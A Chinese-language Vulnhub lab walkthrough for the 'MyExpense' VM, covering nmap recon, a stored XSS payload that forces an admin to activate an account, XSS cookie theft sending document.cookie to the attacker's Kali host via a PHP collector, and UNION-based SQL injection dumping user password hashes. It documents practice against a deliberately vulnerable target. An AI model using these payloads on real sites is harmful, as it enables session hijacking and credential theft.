---
layout: post
title: "MyExpense walkthrough"
date: 2021-07-09
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP              |
| ------------- | --------------- |
| 本机（Win10） | `192.168.1.115` |
| Kali          | `192.168.1.116` |
| MyExpense     | `192.168.1.120` |

### 扫描端口和版本信息

`nmap -A -p- 192.168.1.120`

```shell
┌──(root💀kali)-[/var/www/html]
└─# nmap -A -p- 192.168.1.120
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 07:10 UTC
Nmap scan report for 192.168.1.120
Host is up (0.022s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-robots.txt: 1 disallowed entry
|_/admin/admin.php
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Futura Business Informatique GROUPE - Conseil en ing\xC3\xA9nierie
33181/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
49591/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
53517/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
59229/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
MAC Address: A8:66:7F:1B:19:D8 (Apple)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
```

结果显示，除了正常的**80**端口下的apache服务，还有其他端口下的Mongoose Web服务器端口。并且在*dirb*工具扫描结果中显示网页根目录存在*robots.txt*，以及可疑的*/admin/admin.php*文件。

并且在该文件*http://192.168.1.120/admin/admin.php*中暴露了用户名、邮箱地址、用户岗位等信息，同时也了解到注册用户分为了四类：管理员、财务审批员、主管和员工，其中需注意*Samuel Lamotte*员工用户状态为未激活，同时结合作者设计的[场景](https://www.vulnhub.com/entry/myexpense-1,405/)，需要将提交的费用报表走完报销流程才能获取到flag。

> 场景中，作者给出了*Samuel Lamotte*用户的凭证：`fzghn4lw`

在尝试进行登录时，返回提示信息：`Your account has been locked or is inactive. Please contact the administrator team.`。从提示信息中可知该操作属于管理员范畴，因此接下来我们需要管理员激活该用户。

### 存储型XSS

在*/signup.php*页面中存在存储型XSS漏洞，并且该页面将注册信息保存到数据库，之后*/admin/admin.php*查询用户数据库时就会执行XSS代码，此外管理员在后台也会查看该页面，也会执行XSS代码，因此只需将用户激活的链接插入到XSS代码即可：

```html
<script>document.write('<img src="http://192.168.1.120/admin/admin.php?id=11&status=active" />')</script>
```

再次访问*/admin/admin.php*页面时*slamotte*账户处于激活状态，因此可以进行账户和密码登录：`slamotte:fzghn4lw`。在后台可以看到该用户的费用报告，我们需要做的就是报销费用。

![1]({{ '/expense/1.png' | prepend: site.url }})

在*/profile.php*中知道该用户的上级（主管员）是*Manon Riviere*，因此接下来的操作就是登录到*mriviere*用户，将提交的报销单进行审阅通过。

![2]({{ '/expense/2.png' | prepend: site.url }})

### 获取Cookie

从*/admin/admin.php*结果中可知*mriviere*用户已经激活，那么就使用存储型XSS获取用户Cookie，然后切换到*mriviere*用户。

步骤为：

1. Kali开启apache服务，并且在*/var/www/html/*目录下新建*getcookie.php*文件，内容为：

   ```php
   <?php
   	$cookies = $_GET["cookie"];
   	file_put_contents("allcookies.txt",$cookies."\n",FILE_APPEND);
   ?>
   ```

   > 需要注意的是将目录所属用户组改成*www-data*，才能执行写操作

2. 插入以下XSS代码在页面中

   ```html
	<script>document.write('<img src="http://192.168.1.116/getcookie.php?cookie='+document.cookie+'" width=0 height=0 border=0 />');</script>
	```
	
	![3]({{ '/expense/3.png' | prepend: site.url }})


挨个试试Cookie值，直到登录到*mriviere*用户。

```shell
┌──(root💀kali)-[/var/www/html]
└─# tail -f allcookies.txt
PHPSESSID=1hh8b7bljqi062hfo7uqjrrt42
PHPSESSID=m21bullib1uv6t7aabi1ljs7v4
PHPSESSID=m21bullib1uv6t7aabi1ljs7v4
PHPSESSID=f2akjl5ejq9u1hqcsarcnfm083
PHPSESSID=f2akjl5ejq9u1hqcsarcnfm083
PHPSESSID=e254uduf68vh18lnt0u632eeu1
PHPSESSID=e254uduf68vh18lnt0u632eeu1
PHPSESSID=q25f5ec12n91q2tjbrs36cnja0
PHPSESSID=f2akjl5ejq9u1hqcsarcnfm083
PHPSESSID=f2akjl5ejq9u1hqcsarcnfm083
PHPSESSID=m21bullib1uv6t7aabi1ljs7v4
PHPSESSID=m21bullib1uv6t7aabi1ljs7v4
PHPSESSID=e254uduf68vh18lnt0u632eeu1
PHPSESSID=e254uduf68vh18lnt0u632eeu1
...
```

登录到*miriviere*用户后台后，在*/expense_reports.php*中可以看到*slamotte*用户提交的报销单，对其通过即可。之后该流程进行到财务审批员进行审核，一旦审核通过即可得到flag。

![4]({{ '/expense/4.png' | prepend: site.url }})

### SQL注入

此外在*/site.php*页面中存在SQL注入，步骤有：

1. 判断注入点

   ```sql
   ?id=2
   ?id=2'
   ?id=2 or 1=1 #
   ?id=2 order by 4#
   ?id=2 union select 1,2,3,4#
   ```

   ![5]({{ '/expense/5.png' | prepend: site.url }})


2. 爆表

   ```sql
   ?id=2 union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=database())#
   ```

   > 返回：*expense,message,site,user*

3. 爆列

   ```sql
   ?id=2 union select 1,2,3,(select group_concat(column_name) from information_schema.columns where table_schema=database())#
   ```

   > 返回：*…,username,password,…*

4. 爆密码

   ```sql
   ?id=2 union select 1,2,username,password from user#
   ```

   ![6]({{ '/expense/6.png' | prepend: site.url }})


其中*pbaudouin*用户的MD5加密密码为：*64202ddd5fdea4cc5c2f856efef36e1a*，经过[MD5查询](https://www.cmd5.com/)解密为：*HackMe*

之后的操作比较简单，使用*pbaudouin:HackMe*用户名和密码进行登录，在后台进行审核通过，之后再登录到*slamotte*后台就可得到flag。

![7]({{ '/expense/7.png' | prepend: site.url }})

### 总结

XSS获取Cookie代码：

```html
<script>document.write('<img src="http://192.168.1.116/getcookie.php?cookie='+document.cookie+'" width=0 height=0 border=0 />');</script>
```

```php
<?php
    $cookies = $_GET["cookie"];
    file_put_contents("allcookies.txt",$cookies."\n",FILE_APPEND);
?>
```

